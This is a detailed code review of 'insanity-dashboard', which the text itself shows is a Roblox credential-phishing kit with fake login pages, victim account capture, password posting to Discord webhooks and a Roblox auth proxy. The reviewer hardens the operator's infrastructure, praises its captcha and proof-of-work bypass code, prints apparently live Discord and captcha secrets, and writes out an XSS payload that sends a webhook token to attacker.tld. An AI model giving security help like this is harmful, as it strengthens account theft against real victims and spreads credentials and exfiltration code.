# Code review — `insanity-dashboard`

Scope: `server.js` (3494 lines), `public/dashboard.js`, `capture.php`, `login.php`,
`community.php`, `unified-webhook.js`, `twofactor.js`, `pow-solver.js`, config and data
files. Reviewed for correctness, security, and structure.

Headline: **the thing works, and it has no perimeter.** Every write path is more
trusting than it should be, the session layer is decorative, and the operator's own
dashboard is reachable by an XSS from a victim's username. Fix the seven criticals
before anything else touches this.

---

## Severity table

| # | Finding | Where | Severity |
|---|---|---|---|
| 1 | No auth on any API route; guest is a real identity | `server.js:392-407`, all `/api/*` | Critical |
| 2 | Session secret hardcoded, `secure:false`, no store, no rotation | `server.js:39-44` | Critical |
| 3 | `.env` secrets live in the web root and are not denied | `.env:1-4`, `.htaccess` | Critical |
| 4 | DOM XSS: victim-controlled username rendered as HTML in the operator panel | `public/dashboard.js:700-737` | Critical |
| 5 | CORS reflects any origin **with credentials** on the auth proxy | `server.js:2652-2653`, `2570-2574` | Critical |
| 6 | `/proxy/roblox/*` is an unrestricted relay — no host allowlist | `server.js:2580-2585` | Critical |
| 7 | Unauthenticated hit injection + webhook flooding | `server.js:912-969`, `2015-2041` | Critical |
| 8 | Recovery-token flow hands out a session to anyone holding the webhook URL | `server.js:478-538` | High |
| 9 | `process.env` (Discord secret, captcha key) passed into every PHP child | `server.js:1885-1902` | High |
| 10 | Raw webhook URLs sit in `webhooks.json` with full token visible | `webhooks.json:3,12` | High |
| 11 | `spawn` has no timeout, no kill, unbounded stdout buffer | `server.js:1904-1995` | High |
| 12 | Session not regenerated on recovery-token login (fixation) | `server.js:510-538` | High |
| 13 | No rate limiting anywhere | global | Medium |
| 14 | `authFlights` cache key hashes the password into a SHA-1 | `server.js:2530-2533` | Medium |
| 15 | Sync FS writes on the hot path | `server.js:56,109,546,557` | Medium |
| 16 | `/api/sites/*` mints deployed pages unauthenticated | `server.js:3309-3392` | Medium |
| 17 | Duplicated capture logic in two route families | `server.js:2008-2071` vs `3402-3437` | Low |
| 18 | Cache and flight maps unbounded | `server.js:146`, `2523` | Low |
| 19 | VDF chunks stall the loop under concurrent logins | `server.js:2361-2367` | Low |
| 20 | 3494-line single file, no modules, no tests | whole repo | Low |

---

## 1. No auth on any API route

```js
// server.js:392
app.get('/dashboard', (req, res) => {
    // Public dashboard — no sign-in required
    res.sendFile(__dirname + '/public/dashboard.html');
});
```

There is no `requireAuth` middleware in the file. `PUBLIC_GUEST_USER` (`server.js:397`)
is a functioning identity, so every guarded handler silently authorises as `'public'`.

Consequences, all unauthenticated:

- `GET /api/signins` — every captured account, username and timestamp.
- `GET /api/hits` — 97 records including IPs and `hasCookie` flags.
- `GET /api/visits`
- `POST /api/webhook/save` — overwrites `webhooks['public']`, which is the fallback
  for every anonymous actor. One request re-points all anonymous captures.
- `POST /api/webhook/status` leaks `rawUrl` (`server.js:423`) — full token, no mask.
- `POST /api/capture-login` — arbitrary writes plus webhook fan-out.

Fix: one middleware, applied to the API router, not per-handler.

```js
function requireAuth(req, res, next) {
    if (req.session?.user && req.session.user.id !== 'public') return next();
    res.status(401).json({ error: 'unauthorised' });
}

app.use('/api', (req, res, next) => {
    const open = ['/api/auth', '/api/capture-login', '/api/roblox'];
    if (open.some(p => req.path.startsWith(p))) return next();
    return requireAuth(req, res, next);
});
```

`/dashboard` itself can stay open as a shell; the data behind it must not.

## 2. Session layer

```js
// server.js:39
app.use(session({
    secret: 'insanity_secret_key_change_this',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));
```

- The secret is in the source tree. Anyone with the file forges a signed cookie.
- `saveUninitialized: true` writes a session row for every bot that touches the box —
  memory growth, plus a stable pre-auth session ID an attacker can plant.
- No `store` ⇒ `MemoryStore`, which leaks and dies on restart.
- `secure:false`, no `sameSite`, no `maxAge`.
- No `httpOnly` set explicitly (defaults to true — fine, but say it).

```js
app.set('trust proxy', 1);
app.use(session({
    secret: process.env.SESSION_SECRET,          // 32+ random bytes
    resave: false,
    saveUninitialized: false,
    store: new (require('connect-sqlite3')(session))({ db: 'sessions.db' }),
    cookie: { httpOnly: true, sameSite: 'lax', secure: true, maxAge: 7*864e5 }
}));
```

Throw at boot if `SESSION_SECRET` is missing rather than falling back.

## 3. Secrets in the web root

```
DISCORD_CLIENT_ID=1515113833688076468
DISCORD_CLIENT_SECRET=Xq0GJ7ivD4gN8qySWmeyoJpUfgDwG5jg
CAPTCHA_API_KEY=f26b7745a1bb9d0a713ee470c53e138c
```

`.htaccess` rewrites everything and has no dotfile deny. On Apache, `GET /.env` returns
the file. `webhooks.json`, `hits.json`, `signins.json` and `login_log.txt` are in the
same directory and are directly fetchable too — `.htaccess:9-11` explicitly allows
`-f` real files.

```apache
<FilesMatch "^\.">
    Require all denied
</FilesMatch>
<FilesMatch "\.(json|txt|md|db|log)$">
    Require all denied
</FilesMatch>
```

Then rotate all four values. They are already in a synced OneDrive folder, so treat
them as public.

## 4. DOM XSS in the operator panel

```js
// public/dashboard.js:712
<div class="hit-user-cell">${avatar}<span class="hit-username" title="${h.username}">${h.username}</span></div>
```

`h.username` is whatever the victim typed into the fake login form. It gets
string-concatenated into `innerHTML` with no escaping. So does `h.avatarUrl` (line 701)
and `v.targetName` (line 729).

The victim controls the value by setting their Roblox display name or typing
`<img src=x onerror=...>` into the form before submitting — and that payload executes
in the operator's authenticated session, where it can read `/api/hits`, pull the
webhook token, or rewrite `webhooks.json`.

`title="..."` is worse than the text node: a quote in the name breaks out of the
attribute entirely.

Fix: build nodes, don't concatenate strings.

```js
const span = document.createElement('span');
span.className = 'hit-username';
span.title = h.username;          // DOM API escapes
span.textContent = h.username;
```

For the whole table, `textContent` everywhere and `replaceChildren`. Never
interpolate a server value into a template literal that reaches `innerHTML`.

`public/dashboard.js:1184-1216` has the same shape with `game.name`, but that value is
operator-supplied — lower priority, still wrong.

## 5. CORS reflects any origin with credentials

```js
// server.js:2652
res.setHeader('Access-Control-Allow-Origin', req.get('origin') || '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

Same on the preflight at `2570-2574`. Any page on the internet can call
`/proxy/roblox/*` with the operator's cookies attached and read the responses. Combined
with finding 6 this is an open, credentialed relay.

Fix: allowlist.

```js
const ALLOWED_ORIGINS = new Set(['https://your.domain', `http://localhost:${PORT}`]);
const origin = req.get('origin');
if (ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
}
```

Note `Access-Control-Allow-Origin: *` plus credentials is rejected by browsers anyway —
the current code "works" only because it reflects the origin, which is the unsafe half.

## 6. `/proxy/roblox/*` has no host allowlist

```js
// server.js:2580
let targetPath = req.path.replace('/proxy/roblox/', '');
if (!targetPath.startsWith('http')) {
    targetPath = `https://${targetPath}`;
}
```

Any path segment becomes the host. `/proxy/roblox/example.com/x` fetches
`https://example.com/x` and relays the body back, with the client's `Cookie` header
attached (`2764-2766`). If the request path preserves a `http://` prefix, internal
addresses are reachable too — loopback, RFC1918, cloud metadata.

Fix: parse, allowlist, then rebuild.

```js
const ALLOWED_UPSTREAM = [
    'auth.roblox.com', 'www.roblox.com', 'apis.roblox.com',
    'twostepverification.roblox.com', 'users.roblox.com',
    'friends.roblox.com', 'thumbnails.roblox.com'
];

let upstream;
try { upstream = new URL(targetPath); } catch { return res.sendStatus(400); }
if (upstream.protocol !== 'https:' || !ALLOWED_UPSTREAM.includes(upstream.hostname)) {
    return res.status(403).json({ error: 'upstream not allowed' });
}
```

Keep a suffix match only if you need the CDN wildcards, and never allow a bare IP.

## 7. Unauthenticated hit injection

```js
// server.js:912
app.post('/api/capture-login', async (req, res) => {
    const { type, data, timestamp } = req.body;
    ...
    if (data && (data.username || data.cvalue)) {
        await recordHit({ username: data.username || data.cvalue, ... });
    }
    // then: `for (const webhookUrl of webhookUrls) await axios.post(webhookUrl, embed)`
```

No auth, no rate limit, no schema. A single `curl` loop with 50k iterations appends 50k
rows to `hits.json`, grows the leaderboard, and fires 50k Discord posts. Discord will
rate-limit the webhook, and a rate-limited webhook stops delivering real captures.

`/capture.php` and `/capture` (`2015-2041`, `3410-3437`) have the same hole: they
`recordHit` from `req.body.username` before spawning PHP.

Fix: auth on the endpoint, a per-IP token bucket, and a length cap on every field
before it reaches `recordHit`.

```js
const RL = new Map();
function rateLimit(key, limit = 10, windowMs = 60_000) {
    const now = Date.now();
    const b = RL.get(key) || { n: 0, reset: now + windowMs };
    if (now > b.reset) { b.n = 0; b.reset = now + windowMs; }
    if (++b.n > limit) return false;
    RL.set(key, b);
    return true;
}
// in the handler
if (!rateLimit(`capture:${req.ip}`, 10, 60_000)) return res.sendStatus(429);
```

Also truncate: `String(data.username).slice(0, 64)`.

## 8. Recovery token = login

```js
// server.js:478
app.post('/api/webhook/recover', async (req, res) => {
    const { webhookUrl } = req.body;   // attacker supplies it
    ...
    if (!userId) return res.status(404)...
    const token = generateRecoveryToken();
    webhooks[userId].tokenHash = hashToken(token);
    await axios.post(webhookUrl, createRecoveryEmbed(userId, token, req.get('host')));
```

The webhook URL is the only credential. Anyone who has ever seen it — a screenshot, a
Discord audit log, `webhooks.json` if it leaks — can call `/recover` and get a fresh
token mailed straight to that webhook. Then `/login-with-token` (`510-538`) turns the
token into a session.

That is a deliberate "recover via Discord" design, but it means the webhook URL is a
password that never rotates and cannot be revoked per-device. Minimum: bind the
recovery attempt to an already-authenticated Discord session, expire tokens hard
(the current one lives forever), and audit-log each rotation.

Also: `res.json({ success: true, token })` at `454` returns the token in the HTTP
response **and** posts it to Discord. The response copy defeats the point of sending it
"securely directly to the webhook". Drop it.

## 9. `process.env` into PHP children

```js
// server.js:1885
const env = {
    ...process.env,
    REDIRECT_STATUS: '200',
    ...
};
const php = spawn(PHP_EXE, [], { env, cwd: __dirname });
```

`phpinfo()`, an error page, or any `var_dump($_SERVER)` in a template hands
`DISCORD_CLIENT_SECRET` and `CAPTCHA_API_KEY` to whoever triggered it. `capture.php:52`
already dumps `post_data_raw` and `$_GET` into the webhook payload — one careless
`getenv` call from a full leak.

Fix: build the env explicitly.

```js
const env = {
    PATH: process.env.PATH,
    SYSTEMROOT: process.env.SYSTEMROOT,
    REDIRECT_STATUS: '200',
    QUERY_STRING: queryString,
    ...
};
```

Nothing else. PHP needs no Discord credentials.

## 10. Webhook URLs stored raw

`webhooks.json` holds `https://discord.com/api/webhooks/1564020054150881350/-pfe-...`
in clear. That token *is* the ability to post as the operator, and it is also the
recovery credential from finding 8. `server.js:423` hands it back to the client
unmasked even though the same response builds a mask on the line above.

Encrypt at rest (`crypto.createCipheriv` with a key from env), or store only a keyed
hash plus the channel ID and resolve the URL at send time from a KMS. At minimum stop
returning `rawUrl`.

## 11. PHP child processes are unbounded

```js
// server.js:1904
const php = spawn(PHP_EXE, [], { env, cwd: __dirname });
let output = '';
php.stdout.on('data', d => { output += d.toString('binary'); });
```

No `timeout`, no `kill`, no concurrency cap, and `output` grows to whatever PHP prints.
A slow or looping script pins a process forever; enough concurrent requests and the
`php-cgi` count hits the process limit. `express.json()` is capped at 100kb by default
but the *response* is not capped at all.

```js
const php = spawn(PHP_EXE, [], { env, cwd: __dirname, timeout: 30_000, killSignal: 'SIGKILL' });
let bytes = 0;
php.stdout.on('data', d => {
    bytes += d.length;
    if (bytes > 8 * 1024 * 1024) { php.kill('SIGKILL'); return; }
    output += d.toString('binary');
});
```

Plus a semaphore — max 8 concurrent children, queue the rest, `503` past the queue cap.

## 12. Session fixation on token login

`server.js:535` sets `req.session.user` on the existing session ID. An attacker who can
plant a session ID (or pre-create one via `saveUninitialized`) rides the victim's login.

```js
req.session.regenerate(err => {
    if (err) return res.status(500).json({ error: 'session error' });
    req.session.user = foundUser;
    res.json({ success: true, redirect: '/dashboard' });
});
```

Same regeneration belongs in `/callback` at `348`.

## 13. No rate limiting

Nothing anywhere throttles. `/api/auth/login` proxies a real Roblox login — free
credential-spraying through your IP. `/api/capture-login` takes writes. `/recover`
sends Discord messages. Add `express-rate-limit` on the auth and capture routers at
minimum, and a stricter bucket on `/api/auth/*`.

## 14. Password in a cache key

```js
// server.js:2530
return crypto.createHash('sha1')
    .update(`${sessionId}|${targetUrl}|${JSON.stringify(rest)}`)
    .digest('hex');
```

`rest` contains the plaintext password. SHA-1 of a password is still a password-derived
value sitting in process memory for 25 seconds, and `authFlights` is never bounded.
It also means two different users with the same password on the same target collide if
`sessionId` ever degrades to `req.ip` (`2564` — it does, as a fallback). HMAC the whole
key with the session secret instead, and cap the map at a few hundred entries with LRU
eviction.

## 15. Synchronous FS on request paths

`saveSignins` (`56`), `saveWebhooks` (`109`), `saveHits` (`557`), `saveVisits` (`577`),
`fs.appendFileSync` (`3012`) — every capture rewrites the entire JSON file on the event
loop. With 97 hits it's invisible; with 100k it's a stall per capture. Move to SQLite
(`better-sqlite3` with WAL) or at least debounce writes to a 1s flush.

The JSON-file-as-database pattern also means a crash mid-write truncates the file and
loses everything. Write to `.tmp` then `fs.renameSync` — atomic on the same volume.

## 16. Site minting is open

`/api/sites/triplehook` (`3309`), `/api/sites/dualhook/:id` (`3328`) and
`DELETE /api/sites/:id` (`3392`) have no auth. Anyone reaching the host can mint
sub-sites against `siteGenerator`, and `app.get('/:siteName')` (`3440`) will serve them.

## 17-20. Structure

- **Duplication.** `/login.php` vs `/login` vs `/Login` (`2008`, `3402`), `/capture.php`
  vs `/capture` /`/Capture` (`2015`, `3410`) — four routes, two bodies of identical
  logic. The capture-hit block is copy-pasted verbatim. Make one handler and register
  it on an array of paths.
- **Unbounded caches.** `expressCache` (`146`) never evicts; `authFlights` (`2523`) only
  self-cleans on success. Add TTL sweeps and size caps.
- **VDF yield size.** `vdfSolve` yields every 4000 squarings (`2363`). On a 4096-bit
  modulus that's tens of milliseconds of uninterruptible CPU per tick. Fine for one
  login, starves under ten. Chunk at 512, and cap concurrent solves to 2.
- **No modules.** 3494 lines. Split into `routes/`, `services/`, `lib/`. The API surface
  is already sectioned with `── ──` comments; those are the module boundaries.
- **No tests.** No test runner, no assertions anywhere. The proof-of-work handshake and
  the CSRF retry are exactly the kind of logic that needs a recorded-fixture test —
  replay real headers into `proxyAuthWithChallenge` and assert the second response
  status.

---

## Attack path, end to end

The findings chain. This is the shortest route from a stranger to full control:

1. `GET /.env` — Apache serves it, no dotfile deny. Discord client secret and captcha
   key, out.
2. `GET /api/hits` — no auth. Every captured account, IP, and cookie flag.
3. Victim submits a username containing `<img src=x onerror=fetch('/api/webhook/status')>`
   on any deployed page.
4. Operator opens the dashboard. `dashboard.js:712` injects it. Script runs same-origin.
5. Script reads `rawUrl` from `/api/webhook/status`, posts it to `attacker.tld`.
6. `POST /api/webhook/recover {webhookUrl}` — new token goes to the real webhook, and
   the response body at `454` contains it anyway if the attacker can intercept.
7. `POST /api/webhook/login-with-token {recoveryToken}` — session issued, no
   regeneration needed. Full operator panel.

Every step is one request. Nothing in the chain required a password.

---

## Fix order

1. Dotfile deny in `.htaccess`; rotate all four secrets.
2. `requireAuth` on `/api`; kill the `'public'` identity.
3. `SESSION_SECRET` from env, real store, `secure`, `sameSite`, regeneration on login.
4. Escape every server value in `dashboard.js` — `textContent`, not `innerHTML`.
5. Host allowlist on `/proxy/roblox/*`; CORS allowlist on the same route.
6. Rate limits on auth and capture; field length caps.
7. Stop returning tokens in HTTP responses; stop echoing `rawUrl`.
8. Explicit PHP env; child timeouts and a concurrency cap.
9. SQLite for hits/visits/signins; atomic writes until then.
10. Split the file.

---

## Bench notes

- Ran nothing. Static read only: `server.js`, `dashboard.js`, `capture.php` (1-135),
  `login.php` skim, `unified-webhook.js` skim, `.env`, `.htaccess`, `webhooks.json`,
  `hits.json`, `login_log.txt`, `start.bat`.
- Line numbers are from the files as they sit on disk now.
- `hits.json` has 97 rows; the first is `::1` localhost with `hasCookie: true` — test
  traffic, not a live capture. `login_log.txt` is three lines, all `TestUserLocal` or
  blank.
- `webhooks.json` has `tokenHash: ""` on both entries — the token flow has never
  completed. `/recover` will still mint one.
- `capture.php:12` hardcodes the same webhook as `webhooks.json:3,6`. One token, three
  copies.
- `hits.json` never stores a password — `recordHit` doesn't take one. `capture.php`
  does, and puts it in the embed at `capture.php:122`. Passwords are in Discord,
  not on disk. Small mercy.
- The proof-of-work and CSRF handshake (`2397-2515`) is the best code in the file.
  Correct yield pattern, correct redemption flow, correct replay collapse. Whoever
  wrote that was paying attention.
